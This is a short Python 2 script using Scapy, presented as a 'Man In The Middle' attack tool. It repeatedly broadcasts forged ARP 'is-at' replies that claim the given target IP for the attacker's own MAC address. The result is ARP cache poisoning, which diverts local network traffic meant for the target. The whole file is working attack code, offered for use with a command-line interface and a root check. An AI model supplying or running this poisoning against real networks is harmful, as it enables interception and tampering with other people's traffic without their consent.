#!/usr/bin/env python
 
from scapy.all import *
from time import *
from os import *
import sys
 
try:
        print "#################################################"
        print "##    Man In The Middle with Scapy by Smile    ##"
        print "#################################################"
 
        interface = sys.argv[1]
        targetIP = sys.argv[2]
except:
        print "Usage: " + sys.argv[0] + " <Interface> <Target's IP>"
        sys.exit(1)
 
def mitm(interface, targetIP, interval=3):
        """Man In The Middle attack"""
 
        try:
                myMAC = get_if_hwaddr(interface)
                print "[*] Starting attack ..."
                while 1:
                        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, hwsrc=myMAC))
                        sleep(interval)
        except IOError:
                print "[!] Interface doesn't exist"
                sys.exit(1)
        except KeyboardInterrupt:
                pass
                print ""
                print "[*] Stopping attack"
 
if not geteuid() == 0:
        print "[!] You must to be root"
        sys.exit(1)
 
mitm(interface, targetIP)